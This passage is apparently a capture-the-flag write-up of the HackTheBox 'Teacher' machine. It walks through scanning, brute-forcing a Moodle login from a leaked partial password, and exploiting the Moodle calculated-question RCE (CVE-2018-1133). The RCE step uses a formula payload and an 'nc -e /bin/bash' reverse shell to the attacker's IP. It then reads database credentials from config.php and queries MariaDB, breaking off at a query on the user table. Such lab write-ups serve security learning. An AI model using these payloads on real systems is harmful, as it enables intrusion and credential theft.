## ------------>> Teacher <<----------------

// We start with nmap scan

    $ nmap -sV -A -Pn -T4 10.10.10.153 -p-
---------

    Nmap scan report for 10.10.10.153
    Host is up (0.19s latency).
    Not shown: 65530 closed ports
    PORT      STATE    SERVICE         VERSION
    80/tcp    open     http            Apache httpd 2.4.25 ((Debian))
    |_http-server-header: Apache/2.4.25 (Debian)
    |_http-title: Blackhat highschool
    4494/tcp  filtered unknown
    6629/tcp  filtered nexgen-aux
    9209/tcp  filtered almobile-system
    38131/tcp filtered unknown

// Navigating to http://10.10.10.153/ , present us with a Highschool website

![Image 1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/1.png)

// Next we will use dirsearch to find directories or files on the website

    $python3 dirsearch.py -u http://10.10.10.153/ -t 100 
-----

    ...
    [06:46:36] 301 -  312B  - /fonts  ->  http://10.10.10.153/fonts/
    [06:46:36] 200 -    8KB - /gallery.html
    [06:46:37] 301 -  313B  - /images  ->  http://10.10.10.153/images/
    [06:46:37] 200 -   15KB - /images/
    [06:46:37] 200 -    8KB - /index.html
    [06:46:37] 301 -  317B  - /javascript  ->  http://10.10.10.153/javascript/
    [06:46:37] 200 -    1KB - /js/
    [06:46:38] 200 -  626B  - /manual/index.html
    [06:46:38] 301 -  313B  - /manual  ->  http://10.10.10.153/manual/
    [06:46:39] 301 -  313B  - /moodle  ->  http://10.10.10.153/moodle/
    ...

// Navigating to http://10.10.10.153/images/ we can see all the website photos, exept one - '5.png'

![Image 2](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/2.png)

// When clicking this photo we can see that photo cannot be open due to error in the photo

![Image 3](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/3.png)

// When checking the response to with 'curl' we get some information

    $ curl -i http://10.10.10.153/images/5.png
-------

    HTTP/1.1 200 OK
    Date: Thu, 26 Aug 2021 11:03:09 GMT
    Server: Apache/2.4.25 (Debian)
    Last-Modified: Wed, 27 Jun 2018 01:43:21 GMT
    ETag: "c8-56f95bd633644"
    Accept-Ranges: bytes
    Content-Length: 200
    Content-Type: image/png

    Hi Servicedesk,

    I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.

    Could you guys figure out what the last charachter is, or just reset it?

    Thanks,
    Giovanni

// Great!, we have User name and partly password, Move on...

// When searching a directory with dirsearch we discovered another directory called '/moodle/'

// [Moodle](https://en.wikipedia.org/wiki/Moodle) is a free and open-source learning management system written in PHP and distributed under the GNU General Public License

// Lets check him, and there is a login buttun

![Image 4](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/4.png)

// Clicking on the login navigate us to login page

![Image 5](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/5.png)

// Next part its to complete the missing part of the password([Dictionary Attack](https://searchsecurity.techtarget.com/definition/dictionary-attack)), since we dont know what it is

// I come up with idea to combine [Crunch](https://tools.kali.org/password-attacks/crunch) password list maker tool and Python

// First we will make an password extention txt file with crunch(i limited from 1 to 3 characters)

    $ crunch 1 3 'abcdefghijklmnopqrstuvwxyz1234567890ls%^&*()_+-=@{}[]\/.,`~|#' -o pass_extention.txt

// Next i will make a little python script till 100000 passwords that will 

// add the extention from the extantion file to the existing pass (Th4C00lTheacha)

// !! NOTE !! the script work only for Teacher machine

    f2 = open("combined_pass.txt", "x")
    f = open("pass_extention.txt", "r")

    x = 1
    d = 100000

    while d > x:
       x +=1
       line1 = f.readline(x)
       pass1 = 'Th4C00lTheacha'
       combined = pass1 + line1

       f2.write(combined)


    f.close()
    f2.close()

// Now we got 'combined_pass.txt' passwords file

    $ cat combined_pass.txt
    ...
    Th4C00lTheacha2&|
    Th4C00lTheacha2&#
    Th4C00lTheacha2*a
    Th4C00lTheacha2*b
    ...

// Now that we have a User name and password list We can brute force the login page with BurpSuite Intruder

![Image 6](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/6.png)

// We can see the extra ordinery request its with password 'Th4C00lTheacha#'

// We can login as Giovanni now

// Clicking on the top scrool down button we can see 'Massages' bar, click it

![Image 7](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/7.png)

// We can see a massage sent from giovanni to admin about editing quiz

// Searching in [ExploitDB](https://www.exploit-db.com) for moodle exploits, I found a remote code execution [exploit](https://www.exploit-db.com/exploits/46551)(2018-1133)

// Trying to understant the exploit that writed in PHP, we can see the steps

![Image 8](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/8.png)

            $this->login($url, $user, $pass);
            $this->loadCourse($this->courseId);
            $this->enableEdit();
            $this->addQuiz();
            $this->editQuiz();
            $this->addCalculatedQuestion();
            $this->addEvilQuestion();
            $this->exploit();

// Basically what the exploit does is:

    Login >> Identify id(course number) >> Enable Edit mode(ON) >> Add Quiz
    >> Add questions type Calculated >> Add 'malicious' Answer Formula 
-----

    --- Then we will get a URL '0' parameter that will communicate with system ---

// Lets try this

// Clicking on the top scrool down button we can see 'Profile' bar, click it

![Image 9.1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/9.1.png)

// Next we can see the course 'ALG', click it

![Image 9.2](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/9.2.png)

// Now we click on the gear scrolldown and click on 'Turn editing ON'

![Image 9.3](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/9.3.png)

// Now we click on 'Add an activity or resource' and select 'Quiz' and click 'Add'

![Image 9.4](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/9.4.png)

// Add a name (i added 'shell') and click 'Save and Display'

(![Image 9.5](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/9.5.png)

// Click 'Edit quiz'

![Image 9.6](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/9.6.png)

// Hit the 'Add' scrolldown and click '+ a new question'

![Image 9.7](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/9.7.png)

// Select 'Calculated' option and click 'Add'

![Image 9.8](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/9.8.png)

// Now we need the 'Answer Formula' found in the exploit

![Image 9.9](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/9.9.png)

// Add the formula and change grade to 100% (coz we good students[;)

    /*{a*/`$_GET[0]`;//{x}}

// This will allow us to pass system commands through a url parameter called 0 

![Image 9.10](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/9.10.png)

// Click 'Save changes' and now we can open a listiner

    $ nc -lvnp 1444
    listening on [any] 1444 ...

// Now all that left to do its to add 0 parameter with our payload

// add the payload to the url on the same webpage

    &0=nc -e /bin/bash 10.10.16.232 1444

// the browser will automatclly encode the code

![Image 9.11](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/9.11.png)

// And we got www-data shell !!

    $ nc -lvnp 1444
    listening on [any] 1444 ...

    connect to [10.10.16.232] from (UNKNOWN) [10.10.10.153] 58544

    id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)

// Promote shell with python

    python -c 'import pty; pty.spawn("/bin/bash")'
    www-data@teacher:/var/www/html/moodle/question$ 

// Trying to get the flag i got blocked to enter giovanni user directory due to permissions

    www-data@teacher:/var/www/html/moodle/question$ cd /home/
    www-data@teacher:/home$ ls
    giovanni
    www-data@teacher:/home$ cd giovanni
    bash: cd: giovanni: Permission denied

// Searching around the '/moodle' directory reavels us with 'config.php' file

    www-data@teacher:/var/www/html/moodle$ ls -al  

    ...
    -rw-r--r--  1 root root    728 Nov  3  2018 config.php
    ...

// Lets see the content

    www-data@teacher:/var/www/html/moodle$ cat config.php

    <?php  // Moodle configuration file

    unset($CFG);
    global $CFG;
    $CFG = new stdClass();

    $CFG->dbtype    = 'mariadb';
    $CFG->dblibrary = 'native';
    $CFG->dbhost    = 'localhost';
    $CFG->dbname    = 'moodle';
    $CFG->dbuser    = 'root';
    $CFG->dbpass    = 'Welkom1!';
    $CFG->prefix    = 'mdl_';
    ...

// Great !, We got database credentials !

    root : Welkom1!

// We can check the services running with command 'pstree', to see which database this host using

    www-data@teacher:/var/www/html/moodle$ pstree | head -n 10

    systemd-+-VGAuthService
            |-agetty
            |-apache2-+-9*[apache2]
            |         `-apache2---sh---bash---python---bash-+-head
            |                                               `-pstree
            |-cron
            |-dbus-daemon
            |-mysqld---28*[{mysqld}]
            |-rsyslogd-+-{in:imklog}
            |          |-{in:imuxsock}


// We can connect to mysql database with 'mysql' command

    www-data@teacher:/var/www/html/moodle$ mysql -h 127.0.0.1 -u root -p
    Enter password: Welkom1!

    Welcome to the MariaDB monitor.  Commands end with ; or \g.
    Your MariaDB connection id is 614
    Server version: 10.1.26-MariaDB-0+deb9u1 Debian 9.1

    Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.

    Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

    MariaDB [(none)]> 

// Corrently we not in any database (none), Lets check the exist databases with 'SHOW DATABASES;'

    MariaDB [(none)]> SHOW DATABASES;
    SHOW DATABASES;
    +--------------------+
    | Database           |
    +--------------------+
    | information_schema |
    | moodle             |
    | mysql              |
    | performance_schema |
    | phpmyadmin         |
    +--------------------+
    5 rows in set (0.00 sec)

// The most chances to have credentials its to phpmyadmin amd moodle DATABASES

// Searching in phpmyadmin didnt gave much, So i continued to moodle database

// Checking the tables in moodle database

// Shows us a lot of tables, but the most interesting one its 'mdl_user'

    MariaDB [moodle]> SHOW TABLES;
    SHOW TABLES;
    +----------------------------------+
    | Tables_in_moodle                 |
    +----------------------------------+
    | mdl_analytics_indicator_calc     |
    ...
    | mdl_user                         |
    ...
    | mdl_workshopform_rubric_levels   |
    +----------------------------------+

// Lets see 'mdl_user' table contant

SELECT * from mdl_user;
